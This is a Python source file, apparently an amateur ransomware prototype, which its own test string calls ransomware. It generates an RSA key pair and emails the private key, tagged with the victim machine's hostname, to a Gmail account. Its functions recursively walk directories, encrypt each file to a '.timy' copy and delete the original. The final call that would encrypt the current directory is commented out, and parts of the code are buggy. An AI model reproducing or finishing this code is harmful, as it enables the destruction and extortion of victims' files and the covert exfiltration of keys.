# -*- coding: utf-8 -*- 
import rsa
from rsa.bigfile import *
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
#from email.MIMEText import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import socket
import sys
from PyQt5.QtWidgets import *
from PyQt5 import uic


def send_email(privkey):
    sender = '@gmail.com'
    receiver = '@gmail.com'
    password = ''
    computer_hostname = socket.gethostname()
    msg = MIMEMultipart()
    msg['Subject'] = "PrivateKey From : " + computer_hostname
    msg['From'] = sender
    msg['To'] = receiver

    attach = 'private000.pem'
    out = open(attach,'wb')
    out.write(privkey)
    out.close()
    
    part = MIMEBase('application', 'outer-stream')
    part.set_payload(open('private000.pem','rb').read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    
    msg.attach(part)
    
    server = smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.ehlo()
    server.login(sender,password)
    server.sendmail(sender,receiver,msg.as_string())
    server.close()
    os.remove(attach)
    
def censor_ext(filename):
    extension = ['hwp','zip','7z','doc','docx','ppt','xlsx','pages','py','html','c','java','js','txt','pdf','pptx','exe','mp3','mp4','mkv','avi','jpg','jpeg','png','ogg']
    ext = os.path.splitext(filename)[-1]
    ext = string.strip('.')
    ext = ext.lower()
    if ext in extension:
        return TRUE
    return FALSE

def search(key,dirname,mode):
    try:
        filenames = os.listdir(dirname)
        for filename in filenames:
            full_filename = os.path.join(dirname, filename)
            if os.path.isdir(full_filename):
                search(key,full_filename,mode)
            else:
#                if censor_ext(full_filename) == FALSE:
#                    continue
                if mode == "enc":
                    encrypt_file(key,full_filename)
                elif mode == "dec":
                    decrypt_file(key,full_filename)
    except PermissionError:
        pass
        
        
def encrypt_file(pubkey, filename):
    with open(filename, 'rb') as infile, open(filename+'.timy','wb') as outfile:
        encrypt_bigfile(infile,outfile,pubkey)
    os.remove(filename)
    
def decrypt_file(privkey, filename):
    with open(filename,'rb') as infile, open(filename[:-5],'wb') as outfile:
        decrypt_bigfile(infile,outfile,privkey)    
    os.remove(filename)

    

(pubkey, privkey) = rsa.newkeys(512, poolsize=2) #키 생성, poolsize는 코어수
#너무 오래걸리면 OpenSSL을 사용할 수 있음, 사이트 참고


file = 'hello Im ransomeware'.encode('utf8')
#encode  file as an UTF-8, RSA module only operates on bute and not on string, so this step is necessary
#with open('key.pem',mode='rb') as privatefile:
#   keydata = privatefile.read()
#privkey = rsa.PrivateKey.load_pkcs1(keydata)


crypto = rsa.encrypt(file, pubkey)
#encrypt file by public key
#can encrypt less than the key, so 512-bit key can encode 53-byte message

decrypto = rsa.decrypt(crypto, privkey)
#decrypt file by private key

print(decrypto.decode('utf8'))
print('\n')




#out = open('private000.pem','wb')
#out.write(str(pubkey))
#out.close()
#out = open('public000.pem','wb')
#out.write(str(pubkey))
#out.close()

save_privkey = privkey.save_pkcs1('PEM')
#out = open('private000.pem','wb')
#out.write(a)
#out.close()
send_email(save_privkey)

a = pubkey.save_pkcs1('PEM')
out = open('public000.pem','wb')
out.write(a)
out.close()
# start

#search(pubkey,".","enc")x    



